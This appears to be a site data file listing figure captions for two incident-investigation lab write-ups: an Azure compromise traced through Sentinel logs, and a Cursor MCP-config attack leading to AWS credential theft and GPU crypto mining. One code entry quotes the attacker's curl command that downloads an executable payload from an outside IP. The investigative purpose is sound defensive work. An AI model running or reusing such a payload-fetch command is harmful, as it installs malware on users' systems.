...
window.WRITEUPS = [
    {
        ...
        content: [
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig01-azure-topology.webp', caption: 'Figure 1 — InfiniteTechSolutions Azure environment topology monitored by Microsoft Sentinel' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig02-login-failures.webp', caption: 'Figure 2 — Windows Event log showing failed authentication attempts across target machines (ITWS01: 17, HRWS02: 11, FINWS01: 10, ITWS03: 9)' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig03-malicious-service.webp', caption: "Figure 3 — Windows Event log showing malicious service 'c316a11' installed on ITWS01" },
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig04-service-privileged.webp', caption: "Figure 4 — Windows Event log showing malicious service 'c316a11' installed by privileged account 'infinitetechadmin'" },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig05-password-spray-63.webp', caption: 'Figure 5 — Azure AD sign-in logs showing 63 failed authentication attempts during password spray' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig06-account-lockouts.webp', caption: 'Figure 6 — Azure AD logs showing account lockout events for Sarah Miles and Alice Jones' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig07-maya-wilson-auth.webp', caption: 'Figure 7 — Azure AD sign-in log showing first successful authentication for account Maya Wilson at 19:21' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig08-refresh-token.webp', caption: 'Figure 8 — Azure AD non-interactive sign-in logs showing refreshToken usage 4 minutes after initial compromise' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig09-tom-clarkson.webp', caption: 'Figure 9 — Non-interactive sign-in logs showing suspicious authentication activity from the same IP as Maya Wilson for Tom Clarkson' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig10-graph-enum.webp', caption: 'Figure 10 — Graph API logs showing bulk user enumeration using the delta endpoint' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig11-org-recon.webp', caption: 'Figure 11 — Graph API logs showing organizational data reconnaissance' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig12-automation.webp', caption: "Figure 12a — Azure Automation logs showing creation of malicious runbook 'UsersReminders' and associated schedule" },
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig12b-automation-detail-a.webp', caption: "Figure 12b — Azure Automation diagnostic detail confirming 'UsersReminders' runbook linked to DAILYCHECKER" },
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig12b-automation-detail-b.webp', caption: "Figure 12c — Azure Automation diagnostic detail confirming 'DailyUsersReminder' schedule linked to DAILYCHECKER" },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig13-privesc.webp', caption: "Figure 13 — Azure AD audit log showing suspicious operations after breach, culminating in 'Add owner to application' event for tom.clarkson@infinitechsolutions.xyz on app 9999-8888" },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig14-runbook-update.webp', caption: 'Figure 14 — Azure Automation logs showing runbook update from IP 35.158.160.255' },
            ...
            { type: 'figure', src: '/assets/writeups/soc-apt29/fig15-keyvault.webp', caption: 'Figure 15 — Key Vault diagnostic logs showing unauthorized secret access (SecretGet) across three vaults from IP 35.158.160.255' },
    ...
    },
    {
        ...
        content: [
            ...
            { type: 'figure', src: '/assets/writeups/cursorjack/fig01-browser-history.webp', caption: 'Figure 1 — Browser History database showing the malicious website and Chromium visit timestamp.' },
            { type: 'figure', src: '/assets/writeups/cursorjack/fig02-chromium-timestamp.webp', caption: 'Figure 2 — DCode conversion of the Chromium timestamp to 20 April 2026 at 20:57 UTC.' },
            { type: 'figure', src: '/assets/writeups/cursorjack/fig03-mcp-config.webp', caption: 'Figure 3 — Cursor mcp.json showing the “AWS dev ops” server and embedded payload command.' },
            { type: 'code', text: 'curl -s http://3.72.63.40:80/payload/s.exe -o C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\s.exe' },
            { type: 'figure', src: '/assets/writeups/cursorjack/fig04-sysmon-download.webp', caption: 'Figure 4 — Sysmon event showing curl.exe downloading s.exe from attacker infrastructure.' },
            { type: 'figure', src: '/assets/writeups/cursorjack/fig05-c2-pwd.webp', caption: 'Figure 5 — Sysmon event showing the first observed C2 command, pwd, and execution of s.exe.' },
            ...
            { type: 'figure', src: '/assets/writeups/cursorjack/fig06-credential-staging.webp', caption: 'Figure 6 — Sysmon event showing AWS credentials copied into the .exfil staging directory.' },
            ...
            { type: 'figure', src: '/assets/writeups/cursorjack/fig07-cloudtrail-identity.webp', caption: 'Figure 7 — TrailInspector filtered to source IP 3.72.63.40, showing the compromised IAM identity and automation user agent.' },
            ...
            { type: 'figure', src: '/assets/writeups/cursorjack/fig08-runinstances.webp', caption: 'Figure 8 — TrailInspector query showing 16 RunInstances events across four AWS regions.' },
            { type: 'figure', src: '/assets/writeups/cursorjack/fig09-p3-2xlarge.webp', caption: 'Figure 9 — Raw CloudTrail RunInstances event showing the p3.2xlarge instance type.' },
            { type: 'figure', src: '/assets/writeups/cursorjack/fig10-prod-web-server-tag.webp', caption: 'Figure 10 — Raw CloudTrail event showing the Name=prod-web-server tag.' },
            ...
            { type: 'figure', src: '/assets/writeups/cursorjack/fig11-mining-script.webp', caption: 'Figure 11 — Recovered mining.sh showing XMRig, mining pool, wallet, and background execution options.' },
            ...
            { type: 'figure', src: '/assets/writeups/cursorjack/fig12-wallet-research.webp', caption: 'Figure 12 — Public search results linking the wallet address to the Drift Protocol exploit.' },
            { type: 'figure', src: '/assets/writeups/cursorjack/fig13-solscan-transfer.webp', caption: 'Figure 13 — Solscan filtered transfer showing 45,292.208963921 dSOL from Drift Vault to Drift Exploiter 1.' },
